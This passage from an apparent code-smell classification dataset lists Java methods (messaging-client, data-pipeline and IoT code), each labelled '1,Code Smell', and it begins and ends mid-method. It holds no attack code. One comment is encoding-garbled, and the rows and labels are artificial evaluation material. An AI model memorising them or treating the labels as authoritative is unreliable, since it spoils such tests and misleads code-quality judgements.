          classifierStringDelimiter=value.getValueSource().substring(0,value.getValueSource().indexOf(valueValue));
        }
        classifierEntry=arg;
        classifier=valueValue;
      }
    }
    if (groupId == null || artifactId == null || (version == null && !depMatcher.matches(groupId,artifactId)) || (version != null && !depMatcher.matches(groupId,artifactId,version)) || classifier == null) {
      return m;
    }
    String delimiter=classifierStringDelimiter;
    G.MapEntry finalClassifier=classifierEntry;
    m=m.withArguments(ListUtils.map(m.getArguments(),arg -> {
      if (arg == finalClassifier) {
        return finalClassifier.withValue(((J.Literal)finalClassifier.getValue()).withValue(newClassifier).withValueSource(delimiter + newClassifier + delimiter));
      }
      return arg;
    }
));
  }
  return m;
}",1,Code Smell
"private void loadAndChooseDefaultServer(){
  ClipData clipData=getActivity().getSystemService(ClipboardManager.class).getPrimaryClip();
  if (clipData != null && clipData.getItemCount() > 0) {
    String clipText=clipData.getItemAt(0).coerceToText(getActivity()).toString();
    if (HtmlParser.isValidInviteUrl(clipText)) {
      currentInviteLink=Uri.parse(clipText);
      defaultServerButton.setText(getString(R.string.join_server_x_with_invite,HtmlParser.normalizeDomain(Objects.requireNonNull(currentInviteLink.getHost()))));
    }
  }
 else {
    loadingDefaultServer=true;
    defaultServerButton.setTextVisible(false);
    defaultServerProgress.setVisibility(View.VISIBLE);
  }
  new GetCatalogDefaultInstances().setCallback(new Callback<>(){
    @Override public void onSuccess(    List<CatalogDefaultInstance> result){
      if (result.isEmpty()) {
        setChosenDefaultServer(DEFAULT_SERVER);
        return;
      }
      float sum=0f;
      for (      CatalogDefaultInstance inst : result) {
        sum+=inst.weight;
      }
      if (sum <= 0)       sum=1f;
      for (      CatalogDefaultInstance inst : result) {
        inst.weight/=sum;
      }
      float rand=ThreadLocalRandom.current().nextFloat();
      float prev=0f;
      for (      CatalogDefaultInstance inst : result) {
        if (rand >= prev && rand < prev + inst.weight) {
          setChosenDefaultServer(inst.domain);
          return;
        }
        prev+=inst.weight;
      }
      setChosenDefaultServer(result.get(result.size() - 1).domain);
    }
    @Override public void onError(    ErrorResponse error){
      setChosenDefaultServer(DEFAULT_SERVER);
    }
  }
).execNoAuth("""");
}",1,Code Smell
"/** 
 * changeClusterTag
 */
public String changeClusterTag(String inlongGroupId,String clusterTag,String topic){
  try {
    InlongGroupEntity oldGroup=inlongGroupMapper.selectByGroupId(inlongGroupId);
    if (oldGroup == null) {
      throw new BusinessException(ErrorCodeEnum.GROUP_NOT_FOUND);
    }
    String oldClusterTag=oldGroup.getInlongClusterTag();
    if (StringUtils.equals(oldClusterTag,clusterTag)) {
      return ""Cluster tag is same."";
    }
    final InlongGroupEntity newGroup=this.prepareClusterTagGroup(oldGroup,clusterTag,topic);
    Map<String,InlongClusterEntity> clusterMap=new HashMap<>();
    ClusterPageRequest clusterRequest=new ClusterPageRequest();
    List<InlongClusterEntity> clusters=clusterMapper.selectByCondition(clusterRequest);
    clusters.forEach((v) -> {
      clusterMap.put(v.getName(),v);
    }
);
    SinkPageRequest request=new SinkPageRequest();
    request.setInlongGroupId(inlongGroupId);
    List<StreamSinkEntity> streamSinks=streamSinkMapper.selectByCondition(request);
    List<StreamSinkEntity> newStreamSinks=new ArrayList<>();
    for (    StreamSinkEntity streamSink : streamSinks) {
      String clusterName=streamSink.getInlongClusterName();
      InlongClusterEntity cluster=clusterMap.get(clusterName);
      if (cluster == null) {
        continue;
      }
      if (!StringUtils.equals(oldClusterTag,cluster.getClusterTags())) {
        continue;
      }
      String clusterType=cluster.getType();
      StreamSinkEntity newStreamSink=this.createNewStreamSink(clusters,clusterType,clusterTag,streamSink);
      if (newStreamSink != null) {
        newStreamSinks.add(newStreamSink);
      }
    }
    newStreamSinks.forEach((v) -> {
      streamSinkMapper.insert(v);
    }
);
    int rowCount=inlongGroupMapper.updateByIdentifierSelective(newGroup);
    if (rowCount != InlongConstants.AFFECTED_ONE_ROW) {
      LOGGER.error(""inlong group has already updated with group id={}, curVersion={}"",newGroup.getInlongGroupId(),newGroup.getVersion());
      throw new BusinessException(ErrorCodeEnum.CONFIG_EXPIRED);
    }
    return inlongGroupId;
  }
 catch (  Exception e) {
    LOGGER.error(e.getMessage(),e);
    return e.getMessage();
  }
}
",1,Code Smell
"public boolean putUser(TLRPC.User user,boolean fromCache){
  return putUser(user,fromCache,false);
}
public boolean putUser(TLRPC.User user,boolean fromCache,boolean force){
  if (user == null) {
    return false;
  }
  fromCache=fromCache && user.id / 1000 != 333 && user.id != 777000;
  TLRPC.User oldUser=users.get(user.id);
  if (oldUser == user && !force) {
    return false;
  }
  if (oldUser != null && !TextUtils.isEmpty(oldUser.username)) {
    objectsByUsernames.remove(oldUser.username.toLowerCase());
  }
  if (oldUser != null && oldUser.usernames != null) {
    for (int i=0; i < oldUser.usernames.size(); ++i) {
      TLRPC.TL_username u=oldUser.usernames.get(i);
      if (u != null && u.username != null) {
        objectsByUsernames.remove(u.username.toLowerCase());
      }
    }
  }
  if (!TextUtils.isEmpty(user.username)) {
    objectsByUsernames.put(user.username.toLowerCase(),user);
  }
  if (user != null && user.usernames != null) {
    for (int i=0; i < user.usernames.size(); ++i) {
      TLRPC.TL_username u=user.usernames.get(i);
      if (u != null && u.username != null && u.active) {
        objectsByUsernames.put(u.username.toLowerCase(),user);
      }
    }
  }
  updateEmojiStatusUntilUpdate(user.id,user.emoji_status);
  if (user.min) {
    if (oldUser != null) {
      if (!fromCache) {
        if (user.bot) {
          if (user.username != null) {
            oldUser.username=user.username;
            oldUser.flags|=8;
          }
 else {
            oldUser.flags=oldUser.flags & ~8;
            oldUser.username=null;
          }
        }
        if (user.apply_min_photo) {
          if (user.photo != null) {
            oldUser.photo=user.photo;
            oldUser.flags|=32;
          }
 else {
            oldUser.flags=oldUser.flags & ~32;
            oldUser.photo=null;
          }
        }
      }
    }
 else {
      users.put(user.id,user);
    }
  }
 else {
    if (!fromCache) {
      users.put(user.id,user);
      if (user.id == getUserConfig().getClientUserId()) {
        getUserConfig().setCurrentUser(user);
        getUserConfig().saveConfig(true);
      }
      if (oldUser != null && user.status != null && oldUser.status != null && user.status.expires != oldUser.status.expires) {
        return true;
      }
    }
 else     if (oldUser == null) {
      users.put(user.id,user);
    }
 else     if (oldUser.min) {
      if (oldUser.bot) {
        if (oldUser.username != null) {
          user.username=oldUser.username;
          user.flags|=8;
        }
 else {
          user.flags=user.flags & ~8;
          user.username=null;
        }
      }
      if (oldUser.apply_min_photo) {
        if (oldUser.photo != null) {
          user.photo=oldUser.photo;
          user.flags|=32;
        }
 else {
          user.flags=user.flags & ~32;
          user.photo=null;
        }
      }
      users.put(user.id,user);
    }
  }
  return false;
}",1,Code Smell
"/** 
 * 鍐欏畬涓嬩竴涓狫avaScript瀵硅薄鍚庡仠姝€��
 * @param in
 * @param out
 * @param leftBraceWrote
 * @throws IOException
 */
protected void writeAfterJsObject(Reader in,Writer out,boolean leftBraceWrote) throws IOException {
  int qcount=(leftBraceWrote ? 1 : 0);
  int c=-1;
  while ((c=in.read()) > -1) {
    out.write(c);
    if (c == '{') {
      qcount++;
    }
 else     if (c == '}') {
      qcount--;
      if (qcount == 0)       break;
    }
 else     if (isJsQuote(c)) {
      writeAfterQuote(in,out,c,'\\');
    }
 else     if (c == '/') {
      int c0=in.read();
      writeIfValid(out,c0);
      if (c0 == '/') {
        writeAfterLineComment(in,out);
      }
 else       if (c == '*') {
        writeAfterBlockComment(in,out);
      }
    }
  }
}",1,Code Smell
"public static int tokenNameToType(String name){
switch (name) {
case ""this.self"":
{
      return Token.THIS;
    }
case ""keyword.operator.quantifier.regexp"":
{
    return Token.REGEXP;
  }
case ""variable"":
{
  return Token.NAME;
}
case ""constant.numeric"":
{
return Token.NUMBER;
}
case ""bracket.matched"":
{
return TOKEN_MATCHED_BRACKET;
}
}
for (int token=Token.ERROR; token < Token.LAST_TOKEN; token++) {
if (token == Token.STRICT_SETNAME || token == Token.SETCONSTVAR) continue;
if (Token.typeToName(token).equalsIgnoreCase(name)) {
return token;
}
}
return -2;
}",1,Code Smell
"public SqlRequest createSql(List<Term> terms){
  return createSql(terms,true);
}
public SqlRequest createSql(List<Term> terms,boolean hasWhere){
  Map<String,Term> termsMap=SceneUtils.expandTerm(terms);
  Set<String> selectColumns=Sets.newLinkedHashSetWithExpectedSize(10 + termsMap.size());
  selectColumns.add(""now() \""_now\"""");
  selectColumns.add(""this.timestamp \""timestamp\"""");
  selectColumns.add(""this.deviceId \""deviceId\"""");
  selectColumns.add(""this.headers.deviceName \""deviceName\"""");
  selectColumns.add(""this.headers.productId \""productId\"""");
  selectColumns.add(""this.headers.productName \""productName\"""");
  selectColumns.add(""'device' \"""" + SceneRule.SOURCE_TYPE_KEY + ""\"""");
  selectColumns.add(""this.deviceId \"""" + SceneRule.SOURCE_ID_KEY + ""\"""");
  selectColumns.add(""this.deviceName \"""" + SceneRule.SOURCE_NAME_KEY + ""\"""");
  selectColumns.add(""this.headers._uid \""_uid\"""");
  selectColumns.add(""this.headers.bindings \""_bindings\"""");
  selectColumns.add(""this.headers.traceparent \""traceparent\"""");
switch (this.operation.getOperator()) {
case readProperty:
case writeProperty:
    selectColumns.add(""this.success \""success\"""");
case reportProperty:
  selectColumns.add(""this.properties \""properties\"""");
break;
case reportEvent:
selectColumns.add(""this.data \""data\"""");
break;
case invokeFunction:
selectColumns.add(""this.success \""success\"""");
selectColumns.add(""this['output'] \""output\"""");
break;
}
for (Term value : termsMap.values()) {
String column=value.getColumn();
if (StringUtils.hasText(value.getColumn())) {
String selectColumn=createSelectColumn(column);
if (selectColumn == null) {
continue;
}
String alias=createColumnAlias(value.getColumn());
List<TermValue> termValues=TermValue.of(value);
selectColumns.add(selectColumn + "" "" + alias);
for (TermValue termValue : termValues) {
if (termValue != null && termValue.getSource() == TermValue.Source.metric) {
String property=parseProperty(column);
if (null != property) {
selectColumns.add(String.format(""property.metric('device',deviceId,'%s','%s') %s_metric_%s"",property,termValue.getMetric(),property,termValue.getMetric()));
}
}
}
}
}
StringBuilder builder=new StringBuilder();
builder.append(""select * from (\n"");
builder.append(""\tselect\n"");
int idx=0;
for (String selectColumn : selectColumns) {
if (idx++ > 0) {
builder.append("",\n"");
}
builder.append(""\t"").append(selectColumn);
}
builder.append(""\t\nfrom "").append(createFromTable());
builder.append(""\n) t \n"");
if (hasWhere) {
SqlFragments fragments=terms == null ? EmptySqlFragments.INSTANCE : termBuilder.createTermFragments(this,terms);
if (!fragments.isEmpty()) {
SqlRequest request=fragments.toRequest();
builder.append(""where "").append(request.getSql());
}
return PrepareSqlRequest.of(builder.toString(),fragments.getParameters().toArray());
}
return PrepareSqlRequest.of(builder.toString(),new Object[0]);
}",1,Code Smell
"private void cancelRequests(Runnable fullyCancelled){
  FileLog.d(""cancelRequests"" + (fullyCancelled != null ? "" with callback"" : """"));
  if (requestInfos != null) {
    int[] waitingForCancelledCount=new int[1];
    int[] waitingDownloadSize=new int[2];
    for (int a=0; a < requestInfos.size(); a++) {
      RequestInfo requestInfo=requestInfos.get(a);
      if (requestInfo.requestToken != 0) {
        requestInfo.cancelling=true;
        if (fullyCancelled == null) {
          requestInfo.cancelled=true;
          FileLog.d(""cancelRequests cancel "" + requestInfo.requestToken);
          ConnectionsManager.getInstance(currentAccount).cancelRequest(requestInfo.requestToken,true);
        }
 else {
          requestInfo.whenCancelled=() -> {
            requestInfo.whenCancelled=null;
            requestInfo.cancelled=true;
            waitingForCancelledCount[0]--;
            if (waitingForCancelledCount[0] == 0) {
              fullyCancelled.run();
            }
          }
;
          waitingForCancelledCount[0]++;
          FileLog.d(""cancelRequests cancel "" + requestInfo.requestToken + "" with callback"");
          ConnectionsManager.getInstance(currentAccount).cancelRequest(requestInfo.requestToken,true,() -> {
            if (requestInfo.whenCancelled != null) {
              requestInfo.whenCancelled.run();
            }
          }
);
        }
        int index=requestInfo.connectionType == ConnectionsManager.ConnectionTypeDownload ? 0 : 1;
        waitingDownloadSize[index]+=requestInfo.chunkSize;
      }
    }
    for (int i=0; i < 2; i++) {
      int connectionType=i == 0 ? ConnectionsManager.ConnectionTypeDownload : ConnectionsManager.ConnectionTypeDownload2;
      if (waitingDownloadSize[i] > 1024 * 1024) {
        int datacenterId=isCdn ? cdnDatacenterId : this.datacenterId;
        ConnectionsManager.getInstance(currentAccount).discardConnection(datacenterId,connectionType);
      }
    }
  }
}",1,Code Smell
"private void parseSystemHeader(){
  if (TStringUtils.isBlank(this.attribute)) {
    return;
  }
  if (attribute.contains(TokenConstants.TOKEN_MSG_TYPE) || attribute.contains(TokenConstants.TOKEN_MSG_TIME)) {
    String[] strAttrs=this.attribute.split(TokenConstants.ARRAY_SEP);
    for (    String strAttrItem : strAttrs) {
      if (TStringUtils.isNotBlank(strAttrItem)) {
        if (strAttrItem.contains(TokenConstants.TOKEN_MSG_TYPE)) {
          String[] strItems=strAttrItem.split(TokenConstants.EQ);
          if (strItems.length > 1) {
            this.msgType=strItems[1];
          }
        }
 else         if (strAttrItem.contains(TokenConstants.TOKEN_MSG_TIME)) {
          String[] strItems=strAttrItem.split(TokenConstants.EQ);
          if (strItems.length > 1) {
            try {
              DateTimeConvertUtils.yyyyMMddHHmm2ms(strItems[1]);
              this.msgTime=strItems[1];
            }
 catch (            Throwable ex) {
              this.msgTime=TStringUtils.EMPTY;
            }
          }
        }
      }
    }
    if (TStringUtils.isNotBlank(this.msgType)) {
      this.sysAttributes=TokenConstants.TOKEN_MSG_TYPE + TokenConstants.EQ + this.msgType;
    }
    if (TStringUtils.isNotBlank(this.msgTime)) {
      if (TStringUtils.isBlank(this.sysAttributes)) {
        this.sysAttributes=TokenConstants.TOKEN_MSG_TIME + TokenConstants.EQ + this.msgTime;
      }
 else {
        this.sysAttributes+=TokenConstants.ARRAY_SEP + TokenConstants.TOKEN_MSG_TIME + TokenConstants.EQ+ this.msgTime;
      }
    }
  }
}",1,Code Smell
"public static void postInitApplication(){
  if (applicationInited || applicationContext == null) {
    return;
  }
  applicationInited=true;
  NativeLoader.initNativeLibs(ApplicationLoader.applicationContext);
  SharedConfig.loadConfig();
  LocaleController.getInstance();
  SharedPrefsHelper.init(applicationContext);
  UserConfig.getInstance(0).loadConfig();
  try {
    connectivityManager=(ConnectivityManager)ApplicationLoader.applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE);
    BroadcastReceiver networkStateReceiver=new BroadcastReceiver(){
      @Override public void onReceive(      Context context,      Intent intent){
        try {
          currentNetworkInfo=connectivityManager.getActiveNetworkInfo();
        }
 catch (        Throwable ignore) {
        }
        boolean isSlow=isConnectionSlow();
        for (        int a : SharedConfig.activeAccounts) {
          ConnectionsManager.getInstance(a).checkConnection();
          FileLoader.getInstance(a).onNetworkChanged(isSlow);
        }
        if (SharedConfig.loginingAccount != -1) {
          ConnectionsManager.getInstance(SharedConfig.loginingAccount).checkConnection();
          FileLoader.getInstance(SharedConfig.loginingAccount).onNetworkChanged(isSlow);
        }
      }
    }
;
    IntentFilter filter=new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
    ApplicationLoader.applicationContext.registerReceiver(networkStateReceiver,filter);
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  try {
    final IntentFilter filter=new IntentFilter(Intent.ACTION_SCREEN_ON);
    filter.addAction(Intent.ACTION_SCREEN_OFF);
    final BroadcastReceiver mReceiver=new ScreenReceiver();
    applicationContext.registerReceiver(mReceiver,filter);
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  try {
    PowerManager pm=(PowerManager)ApplicationLoader.applicationContext.getSystemService(Context.POWER_SERVICE);
    isScreenOn=pm.isScreenOn();
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""screen state = "" + isScreenOn);
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  LinkedList<Runnable> postRun=new LinkedList<>();
  for (  int a : SharedConfig.activeAccounts) {
    final int finalA=a;
    Runnable initRunnable=() -> loadAccount(finalA);
    if (finalA == UserConfig.selectedAccount) {
      initRunnable.run();
      ChatThemeController.getInstance(finalA);
    }
 else     postRun.add(initRunnable);
  }
  for (  Runnable runnable : postRun) {
    Utilities.stageQueue.postRunnable(runnable);
  }
  initPushServices();
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""app initied"");
  }
}",1,Code Smell
"@Override public MasterGroupStatus getMasterGroupStatus(boolean isFromHeartbeat){
  if (repEnv == null) {
    return null;
  }
  ReplicationGroup replicationGroup=null;
  try {
    replicationGroup=repEnv.getGroup();
  }
 catch (  DatabaseException e) {
    if (e instanceof EnvironmentFailureException) {
      if (isFromHeartbeat) {
        logger.error(""[BDB Error] Check found EnvironmentFailureException"",e);
        try {
          stop();
          start();
          replicationGroup=repEnv.getGroup();
        }
 catch (        Throwable e1) {
          logger.error(""[BDB Error] close and reopen storeManager error"",e1);
        }
      }
 else {
        logger.error(""[BDB Error] Get EnvironmentFailureException error while non heartBeat request"",e);
      }
    }
 else {
      logger.error(""[BDB Error] Get replication group info error"",e);
    }
  }
catch (  Throwable ee) {
    logger.error(""[BDB Error] Get replication group throw error"",ee);
  }
  if (replicationGroup == null) {
    logger.error(""[BDB Error] ReplicationGroup is null...please check the status of the group!"");
    return null;
  }
  int activeNodes=0;
  boolean isMasterActive=false;
  Set<String> tmp=new HashSet<>();
  for (  ReplicationNode node : replicationGroup.getNodes()) {
    MasterNodeInfo masterNodeInfo=new MasterNodeInfo(replicationGroup.getName(),node.getName(),node.getHostName(),node.getPort());
    try {
      NodeState nodeState=replicationGroupAdmin.getNodeState(node,2000);
      if (nodeState != null) {
        if (nodeState.getNodeState().isActive()) {
          activeNodes++;
          if (nodeState.getNodeName().equals(masterNodeName)) {
            isMasterActive=true;
            masterNodeInfo.setNodeStatus(1);
          }
        }
        if (nodeState.getNodeState().isReplica()) {
          tmp.add(nodeState.getNodeName());
          replicas4Transfer=tmp;
          masterNodeInfo.setNodeStatus(0);
        }
      }
    }
 catch (    IOException e) {
      connectNodeFailCount++;
      masterNodeInfo.setNodeStatus(-1);
      metaSamplePrint.printExceptionCaught(e,node.getHostName(),node.getName());
      continue;
    }
catch (    ServiceDispatcher.ServiceConnectFailedException e) {
      masterNodeInfo.setNodeStatus(-2);
      metaSamplePrint.printExceptionCaught(e,node.getHostName(),node.getName());
      continue;
    }
catch (    Throwable ee) {
      masterNodeInfo.setNodeStatus(-3);
      metaSamplePrint.printExceptionCaught(ee,node.getHostName(),node.getName());
      continue;
    }
  }
  MasterGroupStatus masterGroupStatus=new MasterGroupStatus(isMasterActive);
  int groupSize=replicationGroup.getElectableNodes().size();
  int majoritySize=groupSize / 2 + 1;
  if ((activeNodes >= majoritySize) && isMasterActive) {
    masterGroupStatus.setMasterGroupStatus(true,true,true);
    connectNodeFailCount=0;
    if (isPrimaryNodeActive()) {
      repEnv.setRepMutableConfig(repEnv.getRepMutableConfig().setDesignatedPrimary(false));
    }
  }
  if (groupSize == 2 && connectNodeFailCount >= 3) {
    masterGroupStatus.setMasterGroupStatus(true,false,true);
    if (connectNodeFailCount > 1000) {
      connectNodeFailCount=3;
    }
    if (!isPrimaryNodeActive()) {
      logger.error(""[BDB Error] DesignatedPrimary happened...please check if the other member is down"");
      repEnv.setRepMutableConfig(repEnv.getRepMutableConfig().setDesignatedPrimary(true));
    }
  }
  return masterGroupStatus;
}",1,Code Smell
"private void processClientBalanceMetaInfo(long balanceId,StringBuilder sBuffer){
  int curDoingTasks=this.curCltBalanceParal.get();
  if (curDoingTasks > 0) {
    logger.info(sBuffer.append(""[Clt-Balance Status] "").append(balanceId).append("" the Client-Balance has "").append(curDoingTasks).append("" task(s) in progress!"").toString());
    sBuffer.delete(0,sBuffer.length());
    return;
  }
  List<String> clientGroups=consumerHolder.getAllClientBalanceGroups();
  if (!clientGroups.isEmpty()) {
    int balanceTaskCnt=clientGroups.size();
    int unitNum=(balanceTaskCnt + masterConfig.getRebalanceParallel() - 1) / masterConfig.getRebalanceParallel();
    int startIndex=0;
    int endIndex=0;
    curCltBalanceParal.set(masterConfig.getRebalanceParallel());
    for (int i=0; i < masterConfig.getRebalanceParallel(); i++) {
      startIndex=Math.min((i) * unitNum,balanceTaskCnt);
      endIndex=Math.min((i + 1) * unitNum,balanceTaskCnt);
      final List<String> subGroups=clientGroups.subList(startIndex,endIndex);
      if (subGroups.isEmpty()) {
        curCltBalanceParal.decrementAndGet();
        continue;
      }
      this.cltExecutor.execute(new Runnable(){
        @Override public void run(){
          try {
            if (subGroups.isEmpty()) {
              return;
            }
            ConsumeGroupInfo consumeGroupInfo;
            StringBuilder sBuffer2=new StringBuilder(512);
            for (            String groupName : subGroups) {
              consumeGroupInfo=consumerHolder.getConsumeGroupInfo(groupName);
              if (consumeGroupInfo == null) {
                continue;
              }
              freshTopicMetaInfo(consumeGroupInfo,sBuffer2);
            }
          }
 catch (          Throwable e) {
            logger.warn(""[Clt-Balance Status] Error during process"",e);
          }
 finally {
            curCltBalanceParal.decrementAndGet();
          }
        }
      }
);
    }
  }
}",1,Code Smell
"private boolean checkDeletingTask(boolean runnable){
  int currentServerTime=getConnectionsManager().getCurrentTime();
  if ((currentDeletingTaskMids != null || currentDeletingTaskMediaMids != null) && (runnable || currentDeletingTaskTime != 0 && currentDeletingTaskTime <= currentServerTime)) {
    currentDeletingTaskTime=0;
    if (currentDeleteTaskRunnable != null && !runnable) {
      Utilities.stageQueue.cancelRunnable(currentDeleteTaskRunnable);
    }
    currentDeleteTaskRunnable=null;
    LongSparseArray<ArrayList<Integer>> task=currentDeletingTaskMids != null ? currentDeletingTaskMids.clone() : null;
    LongSparseArray<ArrayList<Integer>> taskMedia=currentDeletingTaskMediaMids != null ? currentDeletingTaskMediaMids.clone() : null;
    AndroidUtilities.runOnUIThread(() -> {
      if (task != null) {
        for (int a=0, N=task.size(); a < N; a++) {
          ArrayList<Integer> mids=task.valueAt(a);
          deleteMessages(mids,null,null,task.keyAt(a),0,true,0,!mids.isEmpty() && mids.get(0) > 0);
        }
      }
      if (taskMedia != null) {
        final boolean checkViewer=SecretMediaViewer.hasInstance() && SecretMediaViewer.getInstance().isVisible();
        final MessageObject viewerObject=checkViewer ? SecretMediaViewer.getInstance().getCurrentMessageObject() : null;
        for (int a=0, N=taskMedia.size(); a < N; a++) {
          long dialogId=taskMedia.keyAt(a);
          ArrayList<Integer> mids=taskMedia.valueAt(a);
          if (checkViewer && viewerObject != null && viewerObject.currentAccount == currentAccount && viewerObject.getDialogId() == dialogId && mids.contains(viewerObject.getId())) {
            final int id=viewerObject.getId();
            mids.remove((Integer)id);
            viewerObject.forceExpired=true;
            final long taskId=createDeleteShowOnceTask(dialogId,id);
            SecretMediaViewer.getInstance().setOnClose(() -> doDeleteShowOnceTask(taskId,dialogId,id));
            getNotificationCenter().postNotificationName(NotificationCenter.updateMessageMedia,viewerObject.messageOwner);
          }
          if (!mids.isEmpty()) {
            getMessagesStorage().emptyMessagesMedia(dialogId,mids);
          }
        }
      }
      Utilities.stageQueue.postRunnable(() -> {
        getNewDeleteTask(task,taskMedia);
        currentDeletingTaskTime=0;
        currentDeletingTaskMids=null;
        currentDeletingTaskMediaMids=null;
      }
);
    }
);
    return true;
  }
  return false;
}",1,Code Smell
"private void showLimit(){
  getMessagesController().getBoostsController().userCanBoostChannel(dialogId,boostsStatus,canApplyBoost -> {
    int type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_COLOR;
    int lvl=0;
    if (currentReplyColor != selectedReplyColor) {
      MessagesController.PeerColors peerColors=getMessagesController().peerColors;
      MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedReplyColor);
      if (peerColor != null && peerColor.getLvl(isGroup) > currentLevel) {
        type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_COLOR;
        lvl=peerColor.getLvl(isGroup);
      }
    }
    if (currentProfileColor != selectedProfileColor) {
      MessagesController.PeerColors peerColors=getMessagesController().profilePeerColors;
      MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedProfileColor);
      if (peerColor != null && peerColor.getLvl(isGroup) > currentLevel) {
        type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_PROFILE_COLOR;
        lvl=peerColor.getLvl(isGroup);
      }
    }
    if (currentReplyEmoji != selectedReplyEmoji && getMessagesController().channelBgIconLevelMin > currentLevel) {
      type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_REPLY_ICON;
    }
    if (currentProfileEmoji != selectedProfileEmoji && getProfileIconLevelMin() > currentLevel) {
      type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_PROFILE_ICON;
    }
    if (!DialogObject.emojiStatusesEqual(currentStatusEmoji,selectedStatusEmoji) && getEmojiStatusLevelMin() > currentLevel) {
      type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_EMOJI_STATUS;
    }
    if (!ChatThemeController.wallpaperEquals(currentWallpaper,selectedWallpaper)) {
      if (!TextUtils.isEmpty(ChatThemeController.getWallpaperEmoticon(selectedWallpaper))) {
        type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_WALLPAPER;
      }
 else {
        type=LimitReachedBottomSheet.TYPE_BOOSTS_FOR_CUSTOM_WALLPAPER;
      }
    }
    final int level=lvl;
    if (getContext() == null || getParentActivity() == null)     return;
    LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(this,getContext(),type,currentAccount,getResourceProvider()){
      @Override protected int channelColorLevelMin(){
        return level;
      }
    }
;
    limitReachedBottomSheet.setCanApplyBoost(canApplyBoost);
    limitReachedBottomSheet.setBoostsStats(boostsStatus,true);
    limitReachedBottomSheet.setDialogId(dialogId);
    TLRPC.Chat channel=getMessagesController().getChat(-dialogId);
    if (channel != null) {
      limitReachedBottomSheet.showStatisticButtonInLink(() -> {
        presentFragment(StatisticActivity.create(channel));
      }
);
    }
    showDialog(limitReachedBottomSheet);
    button.setLoading(false);
  }
);
}",1,Code Smell
"@Override public boolean onNavigationItemSelected(@NonNull MenuItem item){
  int itemId=item.getItemId();
  if (itemId != mCheckItem) {
switch (itemId) {
case R.id.drawer_comic:
case R.id.drawer_source:
      mCheckItem=itemId;
    getSupportFragmentManager().beginTransaction().hide(mCurrentFragment).commit();
  if (mToolbar != null) {
    mToolbar.setTitle(item.getTitle().toString());
  }
mDrawerLayout.closeDrawer(GravityCompat.START);
break;
case R.id.drawer_comiclist:
Intent intentBaidu=new Intent(Intent.ACTION_VIEW,Uri.parse(getString(R.string.home_page_comiclist_url)));
try {
startActivity(intentBaidu);
}
 catch (Exception e) {
showSnackbar(R.string.about_resource_fail);
}
break;
case R.id.drawer_comicUpdate:
update.startUpdate(versionName,content,mUrl,versionCode,md5);
break;
case R.id.drawer_night:
onNightSwitch();
mPreference.putBoolean(PreferenceManager.PREF_NIGHT,night);
break;
case R.id.drawer_settings:
startActivityForResult(new Intent(MainActivity.this,SettingsActivity.class),REQUEST_ACTIVITY_SETTINGS);
break;
case R.id.drawer_about:
startActivity(new Intent(MainActivity.this,AboutActivity.class));
break;
case R.id.drawer_backup:
startActivity(new Intent(MainActivity.this,BackupActivity.class));
break;
}
}
return true;
}",1,Code Smell
"private void processDone(){
  if (doneButtonDrawable.getProgress() > 0f)   return;
  if (!hasChanges()) {
    finishFragment();
    return;
  }
  doneButtonDrawable.animateToProgress(1f);
  TLRPC.UserFull userFull=getMessagesController().getUserFull(getUserConfig().getClientUserId());
  TLRPC.TL_account_updateBusinessWorkHours req=new TLRPC.TL_account_updateBusinessWorkHours();
  ArrayList<TLRPC.TL_businessWeeklyOpen> periods=fromDaysHours(value);
  if (enabled && !periods.isEmpty()) {
    TLRPC.TL_businessWorkHours business_work_hours=new TLRPC.TL_businessWorkHours();
    business_work_hours.timezone_id=timezoneId;
    business_work_hours.weekly_open.addAll(periods);
    req.flags|=1;
    req.business_work_hours=business_work_hours;
    if (userFull != null) {
      userFull.flags2|=1;
      userFull.business_work_hours=business_work_hours;
    }
  }
 else {
    if (userFull != null) {
      userFull.flags2&=~1;
      userFull.business_work_hours=null;
    }
  }
  getConnectionsManager().sendRequest(req,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    if (err != null) {
      doneButtonDrawable.animateToProgress(0f);
      BulletinFactory.showError(err);
    }
 else     if (res instanceof TLRPC.TL_boolFalse) {
      if (getContext() == null)       return;
      doneButtonDrawable.animateToProgress(0f);
      BulletinFactory.of(this).createErrorBulletin(LocaleController.getString(R.string.UnknownError)).show();
    }
 else {
      if (!isFinished && !finishing)       finishFragment();
    }
  }
));
  getMessagesStorage().updateUserInfo(userFull,false);
}",1,Code Smell
"public void loadReactions(boolean cache,Integer lastHash){
  isLoadingReactions=true;
  if (cache) {
    getMessagesStorage().getStorageQueue().postRunnable(() -> {
      SQLiteCursor c=null;
      int hash=0;
      int date=0;
      List<TLRPC.TL_availableReaction> reactions=null;
      try {
        c=getMessagesStorage().getDatabase().queryFinalized(""SELECT data, hash, date FROM reactions"");
        if (c.next()) {
          NativeByteBuffer data=c.byteBufferValue(0);
          if (data != null) {
            int count=data.readInt32(false);
            reactions=new ArrayList<>(count);
            for (int i=0; i < count; i++) {
              TLRPC.TL_availableReaction react=TLRPC.TL_availableReaction.TLdeserialize(data,data.readInt32(false),true);
              reactions.add(react);
            }
            data.reuse();
          }
          hash=c.intValue(1);
          date=c.intValue(2);
        }
      }
 catch (      Exception e) {
        FileLog.e(e,false);
      }
 finally {
        if (c != null) {
          c.dispose();
        }
      }
      List<TLRPC.TL_availableReaction> finalReactions=reactions;
      int finalHash=hash;
      int finalDate=date;
      AndroidUtilities.runOnUIThread(() -> {
        processLoadedReactions(finalReactions,finalHash,finalDate,true);
      }
);
    }
);
  }
 else {
    TLRPC.TL_messages_getAvailableReactions req=new TLRPC.TL_messages_getAvailableReactions();
